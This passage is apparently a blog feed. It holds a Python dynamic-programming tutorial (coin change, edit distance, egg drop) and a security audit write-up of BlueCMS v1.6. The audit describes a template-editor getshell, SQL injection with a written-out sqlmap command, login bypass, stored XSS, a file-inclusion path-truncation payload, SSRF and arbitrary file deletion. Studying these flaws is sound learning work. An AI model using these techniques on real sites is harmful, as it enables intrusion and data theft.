的时候则说明这条路走不通            return -1        res &#x3D; float(&quot;INF&quot;)  # float(&quot;INF&quot;)为正无穷大，负无穷大则为float(&quot;-INF&quot;)        for coin in coins:  # 递归列表            sub &#x3D; main(n - coin)  # 取出一个值n就要减去那个值            if sub &#x3D;&#x3D; -1:                continue  # 当main函数的返回值为-1的时候，这条路走不通，则挑出循环            res &#x3D; min(res, 1 + sub)  # 当到了树的最低下，上面的if语句没有执行跳出去，则使res&#x3D;sub+1        return res if res !&#x3D; float(&quot;INF&quot;) else -1  # 这条路走的通，则返回res的值给sub，结合上面的一条语句进行计数    return main(amount)# 最后取出第一个选择的那个数字的时候计算出的res最小值，然后再把每个数字的最小值拿出来比较得出最终的最小值if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(coinChange([1, 2, 5], 11))</code></pre><p>以上的路走的通的意思是能够凑出这些硬币，递归图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt loading="lazy"></p><h4 id="带备忘录的递归解法-1"><a href="#带备忘录的递归解法-1" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def coinChange(coins, amount):    memo &#x3D; dict()    def main(n):        if n in memo:  # 查找备忘录，避免重复计算，就是计算以上颜色相同的部分            return memo[n]        if n &#x3D;&#x3D; 0:            return 0        if n &lt; 0:            return -1        res &#x3D; float(&quot;INF&quot;)        for coin in coins:            sub &#x3D; main(n - coin)            if sub &#x3D;&#x3D; -1:                continue            res &#x3D; min(res, 1 + sub)        memo[n] &#x3D; (res if res !&#x3D; float(&quot;INF&quot;) else -1)        return memo[n]    return main(amount)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(coinChange([1, 2, 5], 11))</code></pre><h4 id="DP-table解法-1"><a href="#DP-table解法-1" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def main(coins, a):    for i in range(a + 1):        dp.append(i)    for i in range(a + 1):        for coin in coins:            if i - coin &lt; 0:                continue            dp[i] &#x3D; min(dp[i], 1 + dp[i - coin])    return -1 if dp[a] &#x3D;&#x3D; (a + 1) else dp[a]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    dp &#x3D; []    print(main([1, 2, 5], 11))</code></pre><p>演示图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt loading="lazy"></p><p>借用大佬的一句话：</p><p>计算机解决问题其实没有任何奇技淫巧，他唯一的解决方法就是穷举，穷举所有的可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明的穷举”</p><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt loading="lazy"></p><h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>动态规划的核⼼设计思想是数学归纳法。</p><p>假设当结论在<code>k&lt;n</code>的时候成立，然后想办法证明<code>k=n</code>的时候结论也成立，如果能够证明的出来，那么就说明这个结论对于任何数都成立，再看到这个题目，假如我们能够证明，最后一个<code>nums[i]</code>的值大于前一个<code>nums[j]</code>的值，那么就能够证明出他和<code>nums[j]</code>所构成的最长递增子序列能够结合，随后再将长度加一，且将<code>nums[i]</code>加入到这个最长递增子序列中，即：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt loading="lazy"></p><p>代码实现</p><pre class="language-python" data-language="python"><code class="language-python">def main(nums):    res &#x3D; 0    dp &#x3D; []  # 定义每一位数的最长递增子序列    for i in range(len(nums)):        dp.append(1)  # 令每一位的初始值为1    for i in range(len(nums)):        for j in range(i):            if nums[i] &gt; nums[j]:                dp[i] &#x3D; max(dp[i], dp[j] + 1)  # dp[i]表示nums[i]这个数结尾的最长递增子序列的长度    for i in range(len(dp)):        res &#x3D; max(res, dp[i])    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main([8, 7, 10]))</code></pre><p>可见时间复杂度为O(n^2)</p><h4 id="二分查找解法"><a href="#二分查找解法" class="headerlink" title="二分查找解法"></a>二分查找解法</h4><p>将输入的序列分成若干堆，需要遵循以下规则：</p><p>只能把小的数字压到比它大的数字上，也就是用小的数字覆盖掉原来大的，那么如何去压呢？那么就看该数字该如何选择了，如果当前数字较大没有可以放置的堆，那么就在边上新建一个堆，再把数字放进去，如果有多个堆可以选择，则选择这多个堆中考最左边的位置，保证堆顶的数字是有序的了，就像这样（A是最大的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt loading="lazy"></p><p>这样堆顶的数字就可以形成一个最长递增子序列，当然序列肯定不止一个，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt loading="lazy"></p><p>能够保证得出最长递增子序列，随后在查找该放在哪个堆的时候使用二分法查找就可以提高效率，代码如下：</p><pre class="language-python" data-language="python"><code class="language-python">def main(nums):    piles &#x3D; 0  #定义最长递增子序列的长度    top &#x3D; []  # 定义每一位数的最长递增子序列    for i in range(len(nums)):        top.append(0)  # 令每一位的初始值为1    for i in range(len(nums)):        poker &#x3D; nums[i]        left &#x3D; 0        right &#x3D; piles        while left &lt; right:            mid &#x3D; int((left + right) &#x2F; 2)            if top[mid] &gt; poker:                right &#x3D; mid            elif top[mid] &lt; poker:                left &#x3D; mid + 1            else:                right &#x3D; mid        if left &#x3D;&#x3D; piles:            piles +&#x3D; 1  # 最长递增子序列的长度加一        top[left] &#x3D; poker    return pilesif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main([8, 7, 6, 1, 4, 10]))</code></pre><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>先来看一下题目描述</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt loading="lazy"></p><h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    def dp(i, j):        if i &#x3D;&#x3D; -1:            return j + 1  # 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符        if j &#x3D;&#x3D; -1:            return i + 1  # 同上        if s1[i] &#x3D;&#x3D; s2[j]:            return dp(i - 1, j - 1)  # 若相等直接跳过进行下一个字符的判断        else:            return min(dp(i, j - 1) + 1,  # 插入                       dp(i - 1, j - 1) + 1,  # 替换                       dp(i - 1, j) + 1)  # 删除    return dp(len(s1) - 1, len(s2) - 1)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>以上是将<code>apple</code>和<code>add</code>两个字符串进行转换，得出的结果为4，即所需操作的最小值</p><h4 id="带备忘录的递归解法-2"><a href="#带备忘录的递归解法-2" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    memo &#x3D; dict()  # 备忘录    def dp(i, j):        if (i, j) in memo:            return memo[(i, j)]        if i &#x3D;&#x3D; -1:            return j + 1  # 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符        if j &#x3D;&#x3D; -1:            return i + 1  # 同上        if s1[i] &#x3D;&#x3D; s2[j]:            memo[(i, j)] &#x3D; dp(i - 1, j - 1)  # 若相等直接跳过进行下一个字符的判断        else:            memo[(i, j)] &#x3D; min(dp(i, j - 1) + 1,  # 插入                               dp(i - 1, j - 1) + 1,  # 替换                               dp(i - 1, j) + 1)  # 删除        return memo[(i, j)]    return dp(len(s1) - 1, len(s2) - 1)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><h4 id="DP-table解法-2"><a href="#DP-table解法-2" class="headerlink" title="DP table解法"></a>DP table解法</h4><p>自底向上</p><p>首先确定<code>dp</code>数组的含义，<code>dp</code>数组是一个二维数组，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt loading="lazy"></p><p><code>dp[i][j]</code>存储着<code>s1[i]</code>和<code>s2[j]</code>的最小编辑距离，各相邻的数据之间有如下关系：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt loading="lazy"></p><p>于是就可以写出以下代码：</p><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    m &#x3D; len(s1)    n &#x3D; len(s2)    dp &#x3D; dict()    dp[(0, 0)] &#x3D; 0    for i in range(1, m + 1):        dp[(i, 0)] &#x3D; i    for i in range(1, n + 1):        dp[(0, i)] &#x3D; i    for i in range(1, m + 1):        for j in range(1, n + 1):            if s1[i - 1] &#x3D;&#x3D; s2[j - 1]:                dp[(i, j)] &#x3D; dp[(i - 1, j - 1)]            else:                dp[(i, j)] &#x3D; min(dp[(i, j - 1)] + 1,                                 dp[(i - 1, j - 1)] + 1,                                 dp[(i - 1, j)] + 1)    return dp[(m, n)]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>随后还可以将步骤推出来：</p><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    m &#x3D; len(s1)    n &#x3D; len(s2)    dp &#x3D; dict()    a &#x3D; dict()  # 记录每一步的操作 0：啥都不做，1：插入，2：替换，3：删除    dp[(0, 0)] &#x3D; 0    a[(0, 0)] &#x3D; 0    for i in range(1, m + 1):        dp[(i, 0)] &#x3D; i        a[(i, 0)] &#x3D; 3    for i in range(1, n + 1):        dp[(0, i)] &#x3D; i        a[(0, i)] &#x3D; 1    for i in range(1, m + 1):        for j in range(1, n + 1):            if s1[i - 1] &#x3D;&#x3D; s2[j - 1]:                dp[(i, j)] &#x3D; dp[(i - 1, j - 1)]  # 不动，也就是相同直接跳过 0                a[(i, j)] &#x3D; 0            else:                dp[(i, j)] &#x3D; min(dp[(i, j - 1)] + 1,  # 插入 1                                 dp[(i - 1, j - 1)] + 1,  # 替换 2                                 dp[(i - 1, j)] + 1)  # 删除 3            if dp[(i, j)] &#x3D;&#x3D; dp[(i, j - 1)] + 1:                a[(i, j)] &#x3D; 1            elif dp[(i, j)] &#x3D;&#x3D; dp[(i - 1, j - 1)] + 1:                a[(i, j)] &#x3D; 2            elif dp[(i, j)] &#x3D;&#x3D; dp[(i - 1, j)] + 1:                a[(i, j)] &#x3D; 3    for i in range(n + 1):        for j in range(m + 1):            print(a[(j, i)], end&#x3D;&quot;&quot;)        print()    return dp[(m, n)]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>以上代码将输出：</p><pre class="language-none"><code class="language-none">0333331033331122221112224</code></pre><p>从后面往前推就行，0,2代表对角（跳过/替换），1代表向上（插入），3代表向左（删除）</p><p>寻找到0的最佳捷径就OK</p><h3 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h3><p>题目：</p><p>目前有一栋1到<code>N</code>共<code>N</code>层的楼，然后给你<code>K</code>鸡蛋（<code>K</code>至少为1），现在确定这栋楼存在楼层<code>0&lt;=F&lt;=N</code>,在这层楼将鸡蛋扔下去鸡蛋<strong>恰好没有碎</strong>（高于<code>F</code>的楼层都会碎，低于<code>F</code>的楼层都不会碎），现在问，最坏的情况下，你至少要扔多少次鸡蛋，才能确定这个楼层<code>F</code>？</p><h4 id="带备忘录的递归解法-3"><a href="#带备忘录的递归解法-3" class="headerlink" title="带备忘录的递归解法"></a>带备忘录的递归解法</h4><pre class="language-python" data-language="python"><code class="language-python">def main(K, N):  # K个鸡蛋,N层楼    memo &#x3D; dict()    if K &#x3D;&#x3D; 0:        return N    if N &#x3D;&#x3D; 0:        return 0    if (K, N) in memo:        return memo[(K, N)]    res &#x3D; float(&quot;INF&quot;)    for i in range(1, N + 1):        res &#x3D; min(res, max(main(K - 1, i - 1), main(K, N - i)) + 1)  # 在max最坏的情况下，求min最优解，main(K - 1, i - 1)表示碎了，main(K, N - i)表示没碎    memo[(K, N)] &#x3D; res    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main(1, 100))</code></pre><h4 id="二分法优化"><a href="#二分法优化" class="headerlink" title="二分法优化"></a>二分法优化</h4><pre class="language-python" data-language="python"><code class="language-python">def main(K, N):  # K个鸡蛋,N层楼    memo &#x3D; dict()    if K &#x3D;&#x3D; 0:        return N    if N &#x3D;&#x3D; 0:        return 0    if (K, N) in memo:        return memo[(K, N)]    res &#x3D; float(&quot;INF&quot;)    lo &#x3D; 1    hi &#x3D; N    while lo &lt;&#x3D; hi:        mid &#x3D; (lo + hi) &#x2F;&#x2F; 2        broken &#x3D; main(K - 1, mid - 1)  # 碎        not_broken &#x3D; main(K, N - mid)  # 没碎        # res &#x3D; min(max(碎, 没碎) + 1)        if broken &gt; not_broken:            hi &#x3D; mid - 1            res &#x3D; min(res, broken + 1)        else:            lo &#x3D; mid + 1            res &#x3D; min(res, not_broken + 1)    memo[(K, N)] &#x3D; res    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main(1, 100))</code></pre><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;斐波拉契数列&quot;&gt;&lt;a href=&quot;#斐波拉契数列&quot; class=&quot;headerlink&quot; title=&quot;斐波拉契数列&quot;&gt;&lt;/a&gt;斐波拉契数列&lt;/h3&gt;&lt;p&gt;&lt;code&gt;1,1,2,3,5,8,13...&lt;/code&gt;，状态转移方程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
      <category term="算法" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>BlueCMS代码审计</title>
    <link href="https://www.extrader.top/posts/b7c1e15e/"/>
    <id>https://www.extrader.top/posts/b7c1e15e/</id>
    <published>2020-04-15T03:22:30.000Z</published>
    <updated>2020-07-14T12:52:02.642Z</updated>
    
    <content type="html"><![CDATA[<p>“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的</p><p>BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的</p><a id="more"></a><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在后台有一个模板管理的功能，可以编辑前端htm文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt loading="lazy"></p><p>点击编辑抓包</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt loading="lazy"></p><p>可以看到包含了文件，于是我们尝试修改编辑的文件，改为<code>../../ann.php</code>，放包后如下，可以修改</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt loading="lazy"></p><p>随后直接写马连接即可，源码如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt loading="lazy"></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="X-Forwarded-For头注入"><a href="#X-Forwarded-For头注入" class="headerlink" title="X-Forwarded-For头注入"></a>X-Forwarded-For头注入</h4><p>首先看到留言系统后台代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt loading="lazy"></p><p>网站习惯性的把用户留言时的ip保存下来，在看看getip()这个函数怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt loading="lazy"></p><p>getenv()函数获取环境变量的值</p><ul><li>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</li><li>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</li></ul><p>X-Forwarded-For明显可以伪造</p><p>抓包手工延时注入：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt loading="lazy"></p><p>然后写脚本跑就可以了</p><p>sqlmap跑数据库：<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p><p>可以把数据全跑出来</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt loading="lazy"></p><h4 id="首页登录界面SQL注入"><a href="#首页登录界面SQL注入" class="headerlink" title="首页登录界面SQL注入"></a>首页登录界面SQL注入</h4><p>先随便注册一个用户名为root的账号，然后在抓包使用万能密码即可登录任意用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt loading="lazy"></p><p>再来看看源码中是怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt loading="lazy"></p><p>只限制了管理员组的不能从前台登录，参数没经过任何的过滤。。。</p><h4 id="注册界面SQL注入"><a href="#注册界面SQL注入" class="headerlink" title="注册界面SQL注入"></a>注册界面SQL注入</h4><p>既然是注册界面就看肯定有插入数据到数据库中的操作，直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt loading="lazy"></p><p>简单的进行了用户和密码的检测，但并起不到实际的作用，于是在email处尝试进行报错注入，单引号闭合的时候能够成功插入到数据库中并没有报错，于是推测使用了魔术方法对用户的输入进行了转义，而sql语句编码方法使用的gbk编码，于是在单引号前面加上%df构成宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt loading="lazy"></p><p>成功报错但并没有显示出错误信息，查看源代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt loading="lazy"></p><p>似乎只会报sql语法错误，而我们报错注入使用的是XPATH上的语法错误，所以并不会显示出来，于是尝试盲注试试，尝试后视乎并没有执行成功，而是报了错误，原因不明，后面再研究</p><p>另外此处还有一个sql注入漏洞，可以插入多行用户数据，并且在email出嵌入sql语句，用户名单引号用十六进制代替</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt loading="lazy"></p><p>可见成功执行注入，在数据库中成功执行了语句</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt loading="lazy"></p><h4 id="管理登录界面SQL注入"><a href="#管理登录界面SQL注入" class="headerlink" title="管理登录界面SQL注入"></a>管理登录界面SQL注入</h4><p>如下图，万能密码直接进了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt loading="lazy"></p><p>源码，无过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt loading="lazy"></p><h4 id="ad-idSQL注入"><a href="#ad-idSQL注入" class="headerlink" title="ad_idSQL注入"></a>ad_idSQL注入</h4><p>直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt loading="lazy"></p><p>应该存在联合查询注入，随后在第七个字段找到注入点，成功获取数据库名，随后再接着查表列就行了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt loading="lazy"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="个人资料存储型xss"><a href="#个人资料存储型xss" class="headerlink" title="个人资料存储型xss"></a>个人资料存储型xss</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt loading="lazy"></p><p>随后在个人界面和管理员用户界面完美弹窗，再看看数据库中的资料</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt loading="lazy"></p><p>email和msn都嵌入了script代码，为啥其它的没用？因为表字段的长度只有那么长</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt loading="lazy"></p><p>再看看代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt loading="lazy"></p><p>同样未经过过滤，这里还存在sql注入漏洞，就不写了。</p><h4 id="注册界面存储型xss"><a href="#注册界面存储型xss" class="headerlink" title="注册界面存储型xss"></a>注册界面存储型xss</h4><p>注册界面的验证有部分是放在前端进行验证的，也就是用js进行验证，可我们都知道，前端验证并不可靠，真正的验证应该做在后端才行，就比如这里的邮箱验证就放在前端</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt loading="lazy"></p><p>于是我们直接抓包绕过，并在email中注入恶意代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt loading="lazy"></p><p>随后只要前端能够看得到该用户的邮箱，就会执行该恶意代码，就比如管理员的用户列表界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS代码审计/image-20200414101006315.png" style="zoom:80%;" loading="lazy"><h4 id="发布新闻页面存储型XSS"><a href="#发布新闻页面存储型XSS" class="headerlink" title="发布新闻页面存储型XSS"></a>发布新闻页面存储型XSS</h4><p>先看下源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt loading="lazy"></p><p>content参数使用的是<code>filter_data</code>函数进行处理，而这个函数并没有过滤<code>img</code>标签，于是可以利用进行xss攻击</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt loading="lazy"></p><p>随后在新闻页面成功弹窗</p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="备份信息泄露"><a href="#备份信息泄露" class="headerlink" title="备份信息泄露"></a>备份信息泄露</h4><p>管理员界面可以进行数据库备份，备份完后的数据放在这个目录下，并且命名规则为使用当日日期，可以尝试爆破地址</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt loading="lazy"></p><p>访问即可下载sql文件，其中有用户的个人信息，密码经过了md5加密，弱密码的话直接就可以加密开了</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>既然有文件包含漏洞自然少不了那四个<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">文件包含</a>的操作，所以在找文件包含漏洞的时候就需要对这几个操作格外留意</p><h4 id="支付表单文件包含"><a href="#支付表单文件包含" class="headerlink" title="支付表单文件包含"></a>支付表单文件包含</h4><p>先在user.php中找到有<code>include</code>操作的代码，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt loading="lazy"></p><p>可以看到这里我们可以post一个pay参数，且pay参数我们可控，既然有文件包含了，自然就要找到文件上传的地方来包含这个文件来达到getshell的目的，在我们修改个人资料的界面就有上传头像的操作，于是我们上传图片马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt loading="lazy"></p><p>得到路径，而这个文件包含操作在后面还加上了一个<code>/index.php</code>，这里就要根据为Windows下的文件最大路径来截取了，前提条件是php版本要小于<code>5.2.8</code>，Windows下目录最大长度为256字节，超出的部分会被丢弃，于是在提交act=pay的表单处提交一个<code>pay=../../data/upload/face_pic/15869440930.jpg......(超出256个字节)</code>，即可达到效果，由于我这没配php5.2.8的版本就不演示了</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="修改用户头像处SSRF"><a href="#修改用户头像处SSRF" class="headerlink" title="修改用户头像处SSRF"></a>修改用户头像处SSRF</h4><p>源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt loading="lazy"></p><p>这段代码是用来防止<code>http://</code>和<code>https://</code>链接的，但是使用的是弱比价，如果<code>strpos</code>返回的值为0，那么<code>0!=false</code>返回的是<code>false</code>即可绕过判断访问内网资源</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="install无限安装"><a href="#install无限安装" class="headerlink" title="install无限安装"></a>install无限安装</h4><p>install目录是用来安装这个CMS的，但是在经过一次安装后再进入install系统并不会提示已经安装过或者要身份验证，于是就会造成无需任何提交就可以重新安装这个网站的风险，尽管管理员页面有提示（开发人员也有意识到），但如果使用者并没有在意就会造成极大的危害</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt loading="lazy"></p><h4 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h4><p>在输入用户名之后系统会自动发一个包到数据库去验证，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt loading="lazy"></p><p>而这个查询并没有次数限制，于是就可以利用这个数据包传入的user_name值来爆破用户名，造成身份信息泄露</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt loading="lazy"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在修改会员的个人资料页面存在此漏洞，源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt loading="lazy"></p><p><code>face_pic3</code>可控，当<code>face_pic1</code>为空时即可删除<code>face_pic3</code>文件，如下</p><p><img 